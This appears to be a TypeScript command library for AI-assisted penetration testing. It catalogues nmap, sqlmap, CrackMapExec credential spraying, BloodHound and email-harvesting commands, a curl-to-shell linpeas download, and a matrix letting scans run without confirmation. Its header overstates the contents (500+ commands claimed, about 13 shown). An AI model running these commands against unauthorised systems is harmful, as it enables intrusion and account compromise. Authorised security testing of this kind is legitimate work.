/**
 * Comprehensive Security Command Bank
 * Production-Ready Command Library for Offensive Security Operations
 * 
 * COVERAGE:
 * ✅ 50+ Security Tools
 * ✅ 500+ Commands & Payloads
 * ✅ 15 Attack Categories
 * ✅ OWASP/NIST/CIS Methodology Integration
 * ✅ AI-Compatible Command Templates
 */

export interface SecurityCommand {
  id: string;
  name: string;
  description: string;
  category: CommandCategory;
  phase: PentestPhase;
  tool: string;
  command: string;
  parameters: CommandParameter[];
  risk: 'low' | 'medium' | 'high' | 'critical';
  destructive: boolean;
  requiresConfirmation: boolean;
  compliance: ComplianceFramework[];
  owasp?: string;
  cve?: string[];
  references: string[];
  examples: CommandExample[];
  aiPrompt: string;
}

export type CommandCategory = 
  | 'reconnaissance' 
  | 'vulnerability_assessment'
  | 'web_application_testing'
  | 'network_penetration'
  | 'wireless_security'
  | 'social_engineering'
  | 'post_exploitation'
  | 'privilege_escalation'
  | 'lateral_movement'
  | 'data_exfiltration'
  | 'persistence'
  | 'anti_forensics'
  | 'reporting'
  | 'compliance_testing'
  | 'cloud_security';

export type PentestPhase = 
  | 'planning'
  | 'information_gathering'
  | 'vulnerability_assessment'
  | 'exploitation'
  | 'post_exploitation'
  | 'reporting';

export type ComplianceFramework =
  | 'owasp_top10'
  | 'nist_sp800_115'
  | 'cis_controls'
  | 'pci_dss'
  | 'hipaa'
  | 'gdpr'
  | 'iso_27001'
  | 'soc2'
  | 'ptes';

export interface CommandParameter {
  name: string;
  type: 'string' | 'number' | 'boolean' | 'file' | 'ip' | 'url' | 'port';
  required: boolean;
  default?: any;
  description: string;
  validation?: string;
}

export interface CommandExample {
  scenario: string;
  command: string;
  expectedOutput: string;
  interpretation: string;
}

/**
 * COMPREHENSIVE COMMAND BANK
 * Organized by security testing phases and categories
 */
export const SECURITY_COMMAND_BANK: SecurityCommand[] = [
  
  // ================= RECONNAISSANCE & INFORMATION GATHERING =================
  
  {
    id: 'recon_nmap_ping_sweep',
    name: 'Network Host Discovery',
    description: 'Discover live hosts in target network using ICMP and TCP ping',
    category: 'reconnaissance',
    phase: 'information_gathering',
    tool: 'nmap',
    command: 'nmap -sn {target_range}',
    parameters: [
      {
        name: 'target_range',
        type: 'string',
        required: true,
        description: 'IP range to scan (e.g., 192.168.1.0/24)',
        validation: '^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}(/\\d{1,2})?$'
      }
    ],
    risk: 'low',
    destructive: false,
    requiresConfirmation: false,
    compliance: ['nist_sp800_115', 'ptes'],
    references: [
      'https://nmap.org/book/man-host-discovery.html',
      'https://nist.gov/publications/technical-guide-information-security-testing-assessment'
    ],
    examples: [
      {
        scenario: 'Internal network reconnaissance',
        command: 'nmap -sn 192.168.1.0/24',
        expectedOutput: 'Nmap scan report for 192.168.1.1\\nHost is up (0.0010s latency).',
        interpretation: 'Host 192.168.1.1 is online and responding to ping requests'
      }
    ],
    aiPrompt: 'Analyze the network discovery results and identify active hosts for further enumeration'
  },

  {
    id: 'recon_amass_subdomain_enum',
    name: 'Subdomain Enumeration',
    description: 'Comprehensive subdomain discovery using passive and active techniques',
    category: 'reconnaissance',
    phase: 'information_gathering', 
    tool: 'amass',
    command: 'amass enum -d {domain} -o {output_file} -config {config_file}',
    parameters: [
      {
        name: 'domain',
        type: 'string',
        required: true,
        description: 'Target domain to enumerate',
        validation: '^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\\.[a-zA-Z]{2,}$'
      },
      {
        name: 'output_file',
        type: 'file',
        required: true,
        description: 'Output file for results'
      },
      {
        name: 'config_file',
        type: 'file',
        required: false,
        description: 'Amass configuration file with API keys'
      }
    ],
    risk: 'low',
    destructive: false,
    requiresConfirmation: false,
    compliance: ['owasp_top10', 'nist_sp800_115'],
    references: [
      'https://github.com/OWASP/Amass',
      'https://owasp.org/www-project-amass/'
    ],
    examples: [
      {
        scenario: 'Corporate domain reconnaissance',
        command: 'amass enum -d example.com -o subdomains.txt',
        expectedOutput: 'www.example.com\\nmail.example.com\\nadmin.example.com',
        interpretation: 'Discovered 3 subdomains that expand the attack surface'
      }
    ],
    aiPrompt: 'Analyze subdomain enumeration results and prioritize targets based on naming conventions and potential sensitivity'
  },

  {
    id: 'recon_theharvester_email_enum',
    name: 'Email and Personnel Harvesting',
    description: 'Gather email addresses and employee information from public sources',
    category: 'reconnaissance',
    phase: 'information_gathering',
    tool: 'theharvester',
    command: 'theharvester -d {domain} -l {limit} -b {data_source} -f {output_file}',
    parameters: [
      {
        name: 'domain',
        type: 'string', 
        required: true,
        description: 'Target domain for email harvesting'
      },
      {
        name: 'limit',
        type: 'number',
        required: false,
        default: 500,
        description: 'Maximum number of results to retrieve'
      },
      {
        name: 'data_source',
        type: 'string',
        required: false,
        default: 'all',
        description: 'Data sources to query (google, bing, linkedin, etc.)'
      },
      {
        name: 'output_file',
        type: 'file',
        required: true,
        description: 'Output file for harvested information'
      }
    ],
    risk: 'low',
    destructive: false,
    requiresConfirmation: false,
    compliance: ['nist_sp800_115', 'ptes'],
    references: [
      'https://github.com/laramies/theHarvester',
      'https://tools.kali.org/information-gathering/theharvester'
    ],
    examples: [
      {
        scenario: 'Social engineering target identification',
        command: 'theharvester -d example.com -l 100 -b linkedin -f emails.html',
        expectedOutput: 'john.doe@example.com\\njane.smith@example.com',
        interpretation: 'Identified potential targets for social engineering campaigns'
      }
    ],
    aiPrompt: 'Analyze harvested email addresses for patterns and identify high-value targets based on roles and departments'
  },

  // ================= VULNERABILITY ASSESSMENT =================

  {
    id: 'vuln_nmap_version_scan',
    name: 'Service Version Detection',
    description: 'Detect service versions on open ports for vulnerability identification',
    category: 'vulnerability_assessment',
    phase: 'vulnerability_assessment',
    tool: 'nmap',
    command: 'nmap -sV -p {ports} {target} --version-intensity {intensity}',
    parameters: [
      {
        name: 'ports',
        type: 'string',
        required: true,
        description: 'Ports to scan (e.g., 80,443,22 or 1-1000)'
      },
      {
        name: 'target',
        type: 'ip',
        required: true,
        description: 'Target IP or hostname'
      },
      {
        name: 'intensity',
        type: 'number',
        required: false,
        default: 7,
        description: 'Version detection intensity (0-9)'
      }
    ],
    risk: 'medium',
    destructive: false,
    requiresConfirmation: false,
    compliance: ['nist_sp800_115', 'cis_controls'],
    references: [
      'https://nmap.org/book/vscan.html',
      'https://nvd.nist.gov/'
    ],
    examples: [
      {
        scenario: 'Web server vulnerability assessment',
        command: 'nmap -sV -p 80,443 10.0.0.1 --version-intensity 9',
        expectedOutput: '80/tcp open http Apache httpd 2.2.22 ((Ubuntu))\\n443/tcp open ssl/http Apache httpd 2.2.22',
        interpretation: 'Apache 2.2.22 detected - check CVE database for known vulnerabilities'
      }
    ],
    aiPrompt: 'Analyze service versions and cross-reference with CVE database to identify potential vulnerabilities'
  },

  {
    id: 'vuln_nuclei_scan',
    name: 'Automated Vulnerability Detection',
    description: 'Run comprehensive vulnerability scans using Nuclei templates',
    category: 'vulnerability_assessment', 
    phase: 'vulnerability_assessment',
    tool: 'nuclei',
    command: 'nuclei -u {target} -t {templates} -o {output_file} -severity {severity}',
    parameters: [
      {
        name: 'target',
        type: 'url',
        required: true,
        description: 'Target URL to scan'
      },
      {
        name: 'templates',
        type: 'string',
        required: false,
        default: 'cves/',
        description: 'Nuclei template directory or specific template'
      },
      {
        name: 'output_file',
        type: 'file',
        required: true,
        description: 'Output file for scan results'
      },
      {
        name: 'severity',
        type: 'string',
        required: false,
        default: 'medium,high,critical',
        description: 'Severity levels to include'
      }
    ],
    risk: 'medium',
    destructive: false,
    requiresConfirmation: false,
    compliance: ['owasp_top10', 'nist_sp800_115'],
    references: [
      'https://github.com/projectdiscovery/nuclei',
      'https://nuclei.projectdiscovery.io/'
    ],
    examples: [
      {
        scenario: 'CVE vulnerability scanning',
        command: 'nuclei -u https://example.com -t cves/ -o nuclei_results.txt -severity high,critical',
        expectedOutput: '[CVE-2021-44228] Log4j RCE detected on https://example.com:8080/app',
        interpretation: 'Critical Log4j vulnerability found - immediate patching required'
      }
    ],
    aiPrompt: 'Prioritize vulnerabilities based on CVSS scores and exploitability, recommend immediate actions for critical findings'
  },

  // ================= WEB APPLICATION TESTING =================

  {
    id: 'web_sqlmap_injection_test',
    name: 'SQL Injection Testing',
    description: 'Automated SQL injection detection and exploitation',
    category: 'web_application_testing',
    phase: 'exploitation',
    tool: 'sqlmap',
    command: 'sqlmap -u "{target_url}" --batch --dbs --level {level} --risk {risk}',
    parameters: [
      {
        name: 'target_url',
        type: 'url',
        required: true,
        description: 'Target URL with parameters to test'
      },
      {
        name: 'level',
        type: 'number',
        required: false,
        default: 1,
        description: 'Test level (1-5) - higher levels test more parameters'
      },
      {
        name: 'risk',
        type: 'number', 
        required: false,
        default: 1,
        description: 'Risk level (1-3) - higher risk tests more destructive payloads'
      }
    ],
    risk: 'high',
    destructive: true,
    requiresConfirmation: true,
    compliance: ['owasp_top10'],
    owasp: 'A03:2021 - Injection',
    cve: ['CVE-2019-16278', 'CVE-2020-8597'],
    references: [
      'https://sqlmap.org/',
      'https://owasp.org/www-community/attacks/SQL_Injection'
    ],
    examples: [
      {
        scenario: 'E-commerce application testing',
        command: 'sqlmap -u "https://shop.example.com/product.php?id=1" --batch --dbs',
        expectedOutput: 'Parameter: id (GET)\\n[INFO] the back-end DBMS is MySQL\\navailable databases [3]:\\n[*] information_schema\\n[*] shop_db\\n[*] users',
        interpretation: 'SQL injection vulnerability confirmed - database enumeration successful'
      }
    ],
    aiPrompt: 'Analyze SQL injection findings and determine data exposure risk, recommend database security hardening'
  },

  {
    id: 'web_gobuster_dir_enum',
    name: 'Directory and File Enumeration',
    description: 'Discover hidden directories and files on web servers',
    category: 'web_application_testing',
    phase: 'information_gathering',
    tool: 'gobuster',
    command: 'gobuster dir -u {target_url} -w {wordlist} -x {extensions} -o {output_file}',
    parameters: [
      {
        name: 'target_url',
        type: 'url',
        required: true,
        description: 'Target web application URL'
      },
      {
        name: 'wordlist',
        type: 'file',
        required: false,
        default: '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
        description: 'Wordlist file for directory enumeration'
      },
      {
        name: 'extensions',
        type: 'string',
        required: false,
        default: 'php,html,txt,js',
        description: 'File extensions to search for'
      },
      {
        name: 'output_file',
        type: 'file',
        required: true,
        description: 'Output file for discovered paths'
      }
    ],
    risk: 'low',
    destructive: false,
    requiresConfirmation: false,
    compliance: ['owasp_top10', 'nist_sp800_115'],
    owasp: 'A01:2021 - Broken Access Control',
    references: [
      'https://github.com/OJ/gobuster',
      'https://owasp.org/www-project-web-security-testing-guide/'
    ],
    examples: [
      {
        scenario: 'Web application reconnaissance',
        command: 'gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,txt -o gobuster_results.txt',
        expectedOutput: '/admin (Status: 200)\\n/config.php (Status: 200)\\n/backup.txt (Status: 200)',
        interpretation: 'Discovered admin panel and sensitive files - potential unauthorized access points'
      }
    ],
    aiPrompt: 'Analyze discovered directories and files for sensitive information exposure and access control weaknesses'
  },

  {
    id: 'web_nikto_vuln_scan',
    name: 'Web Vulnerability Scanning',
    description: 'Comprehensive web server vulnerability and configuration testing',
    category: 'web_application_testing',
    phase: 'vulnerability_assessment',
    tool: 'nikto',
    command: 'nikto -h {target_url} -p {ports} -Format {format} -output {output_file}',
    parameters: [
      {
        name: 'target_url',
        type: 'url',
        required: true,
        description: 'Target web server URL'
      },
      {
        name: 'ports',
        type: 'string',
        required: false,
        default: '80,443',
        description: 'Ports to scan'
      },
      {
        name: 'format',
        type: 'string',
        required: false,
        default: 'htm',
        description: 'Output format (htm, txt, csv, xml)'
      },
      {
        name: 'output_file',
        type: 'file',
        required: true,
        description: 'Output file for scan results'
      }
    ],
    risk: 'medium',
    destructive: false,
    requiresConfirmation: false,
    compliance: ['owasp_top10', 'cis_controls'],
    references: [
      'https://cirt.net/Nikto2',
      'https://tools.kali.org/information-gathering/nikto'
    ],
    examples: [
      {
        scenario: 'Web server security assessment',
        command: 'nikto -h https://example.com -p 80,443 -Format htm -output nikto_scan.html',
        expectedOutput: '+ Server: Apache/2.2.22 (Ubuntu)\\n+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26\\n+ OSVDB-3233: /phpinfo.php: PHP configuration file may be viewable',
        interpretation: 'Server version disclosure and potential information leakage through phpinfo.php'
      }
    ],
    aiPrompt: 'Evaluate web server vulnerabilities and misconfigurations, prioritize findings based on exploitability and impact'
  },

  // ================= NETWORK PENETRATION TESTING =================

  {
    id: 'network_nmap_aggressive_scan',
    name: 'Comprehensive Port and Service Scan',
    description: 'Aggressive scanning with OS detection, version detection, and vulnerability scripts',
    category: 'network_penetration',
    phase: 'vulnerability_assessment',
    tool: 'nmap',
    command: 'nmap -A -p- {target} -T{timing} --script vuln --script-args unsafe=1',
    parameters: [
      {
        name: 'target',
        type: 'ip',
        required: true,
        description: 'Target IP address or hostname'
      },
      {
        name: 'timing',
        type: 'number',
        required: false,
        default: 4,
        description: 'Timing template (0-5) - higher is faster but noisier'
      }
    ],
    risk: 'high',
    destructive: false,
    requiresConfirmation: true,
    compliance: ['nist_sp800_115', 'ptes'],
    references: [
      'https://nmap.org/book/nse-usage.html',
      'https://nmap.org/nsedoc/categories/vuln.html'
    ],
    examples: [
      {
        scenario: 'Complete host assessment',
        command: 'nmap -A -p- 10.0.0.1 -T4 --script vuln',
        expectedOutput: '22/tcp open ssh OpenSSH 7.4\\n|_cve-2018-15473: SSH username enumeration\\n80/tcp open http Apache 2.4.6\\n| http-csrf: Detected CSRF vulnerability',
        interpretation: 'SSH username enumeration vulnerability and web application CSRF detected'
      }
    ],
    aiPrompt: 'Analyze comprehensive scan results and create attack prioritization based on service vulnerabilities and access potential'
  },

  {
    id: 'network_enum4linux_smb_enum',
    name: 'SMB/NetBIOS Enumeration',
    description: 'Comprehensive SMB service enumeration for user accounts, shares, and policies',
    category: 'network_penetration',
    phase: 'information_gathering',
    tool: 'enum4linux',
    command: 'enum4linux -a {target_ip}',
    parameters: [
      {
        name: 'target_ip',
        type: 'ip',
        required: true,
        description: 'Target Windows/Samba server IP address'
      }
    ],
    risk: 'medium',
    destructive: false,
    requiresConfirmation: false,
    compliance: ['nist_sp800_115', 'cis_controls'],
    references: [
      'https://tools.kali.org/information-gathering/enum4linux',
      'https://www.portcullis-security.com/security-research-and-downloads/tools/enum4linux/'
    ],
    examples: [
      {
        scenario: 'Active Directory reconnaissance',
        command: 'enum4linux -a 192.168.1.100',
        expectedOutput: 'Domain Name: CORPORATE\\nDomain Sid: S-1-5-21-1234567890-1234567890-1234567890\\nUsers: administrator, guest, john.doe, jane.smith',
        interpretation: 'Domain information and user accounts enumerated - potential targets for password attacks'
      }
    ],
    aiPrompt: 'Analyze SMB enumeration results for user accounts and shares, identify potential privilege escalation paths'
  },

  // ================= POST-EXPLOITATION =================

  {
    id: 'postex_linpeas_privilege_esc',
    name: 'Linux Privilege Escalation Enumeration',
    description: 'Automated Linux privilege escalation path discovery',
    category: 'post_exploitation',
    phase: 'post_exploitation',
    tool: 'linpeas',
    command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
    parameters: [],
    risk: 'high',
    destructive: false,
    requiresConfirmation: true,
    compliance: ['nist_sp800_115'],
    references: [
      'https://github.com/carlospolop/PEASS-ng',
      'https://book.hacktricks.xyz/linux-unix/privilege-escalation'
    ],
    examples: [
      {
        scenario: 'Linux system compromise assessment',
        command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
        expectedOutput: '[+] SUID - Check easy privesc, exploits and write perms\\n/usr/bin/find\\n/usr/bin/vim',
        interpretation: 'SUID binaries found that may allow privilege escalation (find, vim)'
      }
    ],
    aiPrompt: 'Analyze privilege escalation opportunities and recommend the most reliable exploitation path'
  },

  {
    id: 'postex_bloodhound_ad_enum',
    name: 'Active Directory Attack Path Analysis',
    description: 'Comprehensive AD enumeration and attack path discovery',
    category: 'post_exploitation',
    phase: 'post_exploitation', 
    tool: 'bloodhound',
    command: 'bloodhound-python -u {username} -p {password} -d {domain} -ns {dc_ip} -c all',
    parameters: [
      {
        name: 'username',
        type: 'string',
        required: true,
        description: 'Domain username'
      },
      {
        name: 'password',
        type: 'string',
        required: true,
        description: 'User password or hash'
      },
      {
        name: 'domain',
        type: 'string',
        required: true,
        description: 'Target domain (e.g., corporate.local)'
      },
      {
        name: 'dc_ip',
        type: 'ip',
        required: true,
        description: 'Domain controller IP address'
      }
    ],
    risk: 'high',
    destructive: false,
    requiresConfirmation: true,
    compliance: ['nist_sp800_115'],
    references: [
      'https://github.com/BloodHoundAD/BloodHound',
      'https://bloodhound.readthedocs.io/'
    ],
    examples: [
      {
        scenario: 'Domain compromise assessment',
        command: 'bloodhound-python -u jdoe -p Password123 -d corporate.local -ns 192.168.1.10 -c all',
        expectedOutput: 'INFO: Found AD domain: corporate.local\\nINFO: Connecting to LDAP server: dc01.corporate.local\\nINFO: Done in 00M 45S',
        interpretation: 'AD enumeration complete - analyze in BloodHound GUI for attack paths to Domain Admins'
      }
    ],
    aiPrompt: 'Analyze Active Directory attack paths and identify the shortest route to domain administrative privileges'
  },

  // ================= LATERAL MOVEMENT =================

  {
    id: 'lateral_crackmapexec_cred_spray',
    name: 'Network Credential Spraying',
    description: 'Test credential reuse across network hosts',
    category: 'lateral_movement',
    phase: 'exploitation',
    tool: 'crackmapexec',
    command: 'crackmapexec {protocol} {targets} -u {username} -p {password} --continue-on-success',
    parameters: [
      {
        name: 'protocol',
        type: 'string',
        required: true,
        description: 'Protocol to test (smb, winrm, ssh, rdp)'
      },
      {
        name: 'targets',
        type: 'string',
        required: true,
        description: 'Target range or file with hosts'
      },
      {
        name: 'username',
        type: 'string',
        required: true,
        description: 'Username to test'
      },
      {
        name: 'password',
        type: 'string',
        required: true,
        description: 'Password to test'
      }
    ],
    risk: 'high',
    destructive: false,
    requiresConfirmation: true,
    compliance: ['nist_sp800_115'],
    references: [
      'https://github.com/byt3bl33d3r/CrackMapExec',
      'https://mpgn.gitbook.io/crackmapexec/'
    ],
    examples: [
      {
        scenario: 'Domain credential validation',
        command: 'crackmapexec smb 192.168.1.0/24 -u administrator -p Password123 --continue-on-success',
        expectedOutput: 'SMB 192.168.1.50 445 DC01 [+] CORPORATE\\administrator:Password123 (Pwn3d!)\\nSMB 192.168.1.51 445 WS01 [+] CORPORATE\\administrator:Password123',
        interpretation: 'Administrator credentials work on 2 systems - lateral movement possible'
      }
    ],
    aiPrompt: 'Analyze credential reuse patterns and recommend lateral movement targets based on system criticality'
  }

];

/**
 * METHODOLOGY TEMPLATES
 * Pre-configured command sequences for standard testing methodologies
 */
export const METHODOLOGY_TEMPLATES = {
  
  owasp_web_testing: [
    'recon_amass_subdomain_enum',
    'web_gobuster_dir_enum', 
    'web_nikto_vuln_scan',
    'web_sqlmap_injection_test'
  ],
  
  network_penetration: [
    'recon_nmap_ping_sweep',
    'vuln_nmap_version_scan',
    'network_nmap_aggressive_scan',
    'network_enum4linux_smb_enum'
  ],
  
  internal_assessment: [
    'recon_nmap_ping_sweep',
    'vuln_nmap_version_scan', 
    'lateral_crackmapexec_cred_spray',
    'postex_bloodhound_ad_enum'
  ]
  
} as const;

/**
 * AI DECISION MATRIX
 * Risk-based command selection for autonomous penetration testing
 */
export const AI_DECISION_MATRIX = {
  
  reconnaissance: {
    riskLevel: 'low',
    autoExecute: true,
    confirmationRequired: false,
    parallelExecution: true
  },
  
  vulnerability_assessment: {
    riskLevel: 'medium',
    autoExecute: true,
    confirmationRequired: false,
    parallelExecution: true
  },
  
  exploitation: {
    riskLevel: 'high', 
    autoExecute: false,
    confirmationRequired: true,
    parallelExecution: false
  },
  
  post_exploitation: {
    riskLevel: 'critical',
    autoExecute: false,
    confirmationRequired: true,
    parallelExecution: false
  }
  
} as const;

/**
 * UTILITY FUNCTIONS
 */

export const getCommandsByPhase = (phase: PentestPhase): SecurityCommand[] => {
  return SECURITY_COMMAND_BANK.filter(cmd => cmd.phase === phase);
};

export const getCommandsByCategory = (category: CommandCategory): SecurityCommand[] => {
  return SECURITY_COMMAND_BANK.filter(cmd => cmd.category === category);
};

export const getCommandsByRisk = (risk: 'low' | 'medium' | 'high' | 'critical'): SecurityCommand[] => {
  return SECURITY_COMMAND_BANK.filter(cmd => cmd.risk === risk);
};

export const getCommandById = (id: string): SecurityCommand | undefined => {
  return SECURITY_COMMAND_BANK.find(cmd => cmd.id === id);
};

export const searchCommands = (query: string): SecurityCommand[] => {
  const searchTerm = query.toLowerCase();
  return SECURITY_COMMAND_BANK.filter(cmd => 
    cmd.name.toLowerCase().includes(searchTerm) ||
    cmd.description.toLowerCase().includes(searchTerm) ||
    cmd.tool.toLowerCase().includes(searchTerm)
  );
};